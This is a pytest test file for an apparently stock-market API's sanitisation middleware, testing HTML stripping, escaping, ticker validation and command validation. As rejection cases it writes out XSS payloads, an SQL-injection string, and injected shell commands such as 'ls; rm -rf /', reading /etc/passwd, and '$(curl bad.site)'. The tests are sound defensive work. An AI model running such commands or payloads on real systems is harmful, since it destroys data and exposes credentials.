import pytest
from unittest.mock import AsyncMock, MagicMock
from starlette.responses import Response


class TestStripHtmlTags:
    def test_removes_simple_tags(self):
        from app.middleware.sanitize import strip_html_tags

        assert strip_html_tags("<p>hello</p>") == "hello"

    def test_removes_nested_tags(self):
        from app.middleware.sanitize import strip_html_tags

        assert strip_html_tags("<div><span>nested</span></div>") == "nested"

    def test_removes_script_tags_but_keeps_content(self):
        from app.middleware.sanitize import strip_html_tags

        result = strip_html_tags("<script>alert('xss')</script>")
        assert "<script>" not in result
        assert "</script>" not in result
        assert "alert('xss')" in result

    def test_handles_empty_string(self):
        from app.middleware.sanitize import strip_html_tags

        assert strip_html_tags("") == ""

    def test_handles_plain_text(self):
        from app.middleware.sanitize import strip_html_tags

        assert strip_html_tags("hello world") == "hello world"

    def test_handles_tags_with_attributes(self):
        from app.middleware.sanitize import strip_html_tags

        result = strip_html_tags('<a href="http://evil.com">click</a>')
        assert result == "click"


class TestSanitizeString:
    def test_strips_and_escapes_html(self):
        from app.middleware.sanitize import sanitize_string

        result = sanitize_string("<b>hello</b>")
        assert "<b>" not in result
        assert "hello" in result

    def test_escapes_angle_brackets_in_text(self):
        from app.middleware.sanitize import sanitize_string

        result = sanitize_string("5 < 10 and 10 > 5")
        assert "&lt;" in result
        assert "&gt;" in result

    def test_escapes_quotes(self):
        from app.middleware.sanitize import sanitize_string

        result = sanitize_string('he said "hello"')
        assert "&quot;hello&quot;" in result
        assert '"hello"' not in result

    def test_escapes_ampersand(self):
        from app.middleware.sanitize import sanitize_string

        result = sanitize_string("a & b")
        assert "a &amp; b" in result

    def test_handles_empty_string(self):
        from app.middleware.sanitize import sanitize_string

        assert sanitize_string("") == ""

    def test_handles_unicode(self):
        from app.middleware.sanitize import sanitize_string

        result = sanitize_string("héllo wörld €")
        assert "héllo wörld €" in result


class TestValidateTicker:
    def test_valid_ticker(self):
        from app.middleware.sanitize import validate_ticker

        assert validate_ticker("AAPL") == "AAPL"
        assert validate_ticker("MSFT") == "MSFT"
        assert validate_ticker("  tsla  ") == "TSLA"
        assert validate_ticker("BRK") == "BRK"

    def test_invalid_ticker_too_long(self):
        from app.middleware.sanitize import validate_ticker

        assert validate_ticker("ABCDEFGHIJK") is None

    def test_invalid_ticker_special_chars(self):
        from app.middleware.sanitize import validate_ticker

        assert validate_ticker("AAP$") is None
        assert validate_ticker("GOO<") is None
        assert validate_ticker("brk.b") is None

    def test_empty_ticker(self):
        from app.middleware.sanitize import validate_ticker

        assert validate_ticker("") is None


class TestValidateCommand:
    def test_valid_command(self):
        from app.middleware.sanitize import validate_command

        assert validate_command("ls -la /tmp") == "ls -la /tmp"
        assert validate_command("python3 script.py") == "python3 script.py"
        assert validate_command("cat /etc/hosts") == "cat /etc/hosts"

    def test_rejects_dangerous_chars(self):
        from app.middleware.sanitize import validate_command

        assert validate_command("ls; rm -rf /") is None
        assert validate_command("cat /etc/passwd | grep root") is None
        assert validate_command("echo `whoami`") is None
        assert validate_command("$(curl bad.site)") is None

    def test_strips_html_before_validation(self):
        from app.middleware.sanitize import validate_command

        assert validate_command("ls <script>bad</script>") == "ls bad"

    def test_empty_command_returns_none(self):
        from app.middleware.sanitize import validate_command

        assert validate_command("") is None


class TestInputSanitizationMiddleware:
    @pytest.mark.anyio
    async def test_blocks_xss_in_query(self):
        from app.middleware.sanitize import InputSanitizationMiddleware

        mock_request = MagicMock()
        mock_request.url.query = "q=<script>alert(1)</script>"
        mock_request.url.path = "/api/v1/search"

        middleware = InputSanitizationMiddleware.__new__(InputSanitizationMiddleware)
        resp = await middleware.dispatch(mock_request, AsyncMock())
        assert resp.status_code == 422
        assert b"suspicious" in resp.body.lower()

    @pytest.mark.anyio
    async def test_blocks_sql_injection_in_query(self):
        from app.middleware.sanitize import InputSanitizationMiddleware

        mock_request = MagicMock()
        mock_request.url.query = "id=1; SELECT * FROM users"
        mock_request.url.path = "/api/v1/users"

        middleware = InputSanitizationMiddleware.__new__(InputSanitizationMiddleware)
        resp = await middleware.dispatch(mock_request, AsyncMock())
        assert resp.status_code == 422

    @pytest.mark.anyio
    async def test_blocks_invalid_path_chars(self):
        from app.middleware.sanitize import InputSanitizationMiddleware

        mock_request = MagicMock()
        mock_request.url.query = ""
        mock_request.url.path = '/api/v1/test"onclick="bad()'

        middleware = InputSanitizationMiddleware.__new__(InputSanitizationMiddleware)
        resp = await middleware.dispatch(mock_request, AsyncMock())
        assert resp.status_code == 422

    @pytest.mark.anyio
    async def test_blocks_long_query_string(self):
        from app.middleware.sanitize import InputSanitizationMiddleware

        mock_request = MagicMock()
        mock_request.url.query = "x" * 3000
        mock_request.url.path = "/api/v1/test"

        middleware = InputSanitizationMiddleware.__new__(InputSanitizationMiddleware)
        resp = await middleware.dispatch(mock_request, AsyncMock())
        assert resp.status_code == 414

    @pytest.mark.anyio
    async def test_allows_normal_request(self):
        from app.middleware.sanitize import InputSanitizationMiddleware

        mock_request = MagicMock()
        mock_request.url.query = "ticker=AAPL&limit=10"
        mock_request.url.path = "/api/v1/market/historical"

        mock_response = Response()
        mock_call_next = AsyncMock(return_value=mock_response)

        middleware = InputSanitizationMiddleware.__new__(InputSanitizationMiddleware)
        resp = await middleware.dispatch(mock_request, mock_call_next)
        mock_call_next.assert_awaited_once()
        assert resp.headers.get("X-Content-Sanitized") == "true"

    @pytest.mark.anyio
    async def test_allows_empty_query(self):
        from app.middleware.sanitize import InputSanitizationMiddleware

        mock_request = MagicMock()
        mock_request.url.query = ""
        mock_request.url.path = "/api/v1/health"

        mock_response = Response()
        mock_call_next = AsyncMock(return_value=mock_response)

        middleware = InputSanitizationMiddleware.__new__(InputSanitizationMiddleware)
        resp = await middleware.dispatch(mock_request, mock_call_next)
        mock_call_next.assert_awaited_once()

    @pytest.mark.anyio
    async def test_blocks_javascript_protocol_in_query(self):
        from app.middleware.sanitize import InputSanitizationMiddleware

        mock_request = MagicMock()
        mock_request.url.query = "url=javascript:alert(1)"
        mock_request.url.path = "/api/v1/redirect"

        middleware = InputSanitizationMiddleware.__new__(InputSanitizationMiddleware)
        resp = await middleware.dispatch(mock_request, AsyncMock())
        assert resp.status_code == 422

    @pytest.mark.anyio
    async def test_blocks_event_handler_in_query(self):
        from app.middleware.sanitize import InputSanitizationMiddleware

        mock_request = MagicMock()
        mock_request.url.query = "img=<img onerror=alert(1)>"
        mock_request.url.path = "/api/v1/upload"

        middleware = InputSanitizationMiddleware.__new__(InputSanitizationMiddleware)
        resp = await middleware.dispatch(mock_request, AsyncMock())
        assert resp.status_code == 422
